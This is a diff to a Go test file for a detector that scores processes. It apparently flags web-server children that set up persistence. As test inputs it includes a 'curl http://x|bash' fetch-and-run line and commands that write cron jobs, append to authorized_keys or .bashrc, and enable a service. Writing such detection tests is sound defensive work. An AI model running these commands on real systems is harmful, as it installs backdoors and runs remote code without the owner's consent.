@@ -83,6 +83,28 @@ func TestScoreProcessNotWeb(t *testing.T) {
 	if f := scoreProcess(false, "/bin/bash", "bash -c curl http://x|bash", 0); f.score != 0 {
 		t.Fatalf("a non-web context fired: %+v", f)
 	}
+	// A tenant editing their own cron over SSH is not a web context either.
+	if f := scoreProcess(false, "/usr/bin/crontab", "crontab -", 1000); f.score != 0 {
+		t.Fatalf("a non-web persistence edit fired: %+v", f)
+	}
+}
+
+// A web process touching a persistence surface (cron, authorized_keys, a service
+// enable) is critical: a php-fpm child never sets these up legitimately.
+func TestScoreProcessWebPersistence(t *testing.T) {
+	cases := []string{
+		"sh -c crontab -",
+		"sh -c echo '* * * * * /tmp/x' >> /var/spool/cron/c_x",
+		"bash -c echo key >> /home/c_x/.ssh/authorized_keys",
+		"sh -c systemctl enable evil.service",
+		"sh -c echo payload >> /home/c_x/.bashrc",
+	}
+	for _, cl := range cases {
+		f := scoreProcess(true, "/bin/sh", cl, 1000)
+		if f.score < procScoreCritical || f.code != reasonWebPersistence {
+			t.Fatalf("web persistence not caught: %q -> %+v", cl, f)
+		}
+	}
 }
 
 // Servika-specific: internal/apps runs a tenant's own dependency binary from
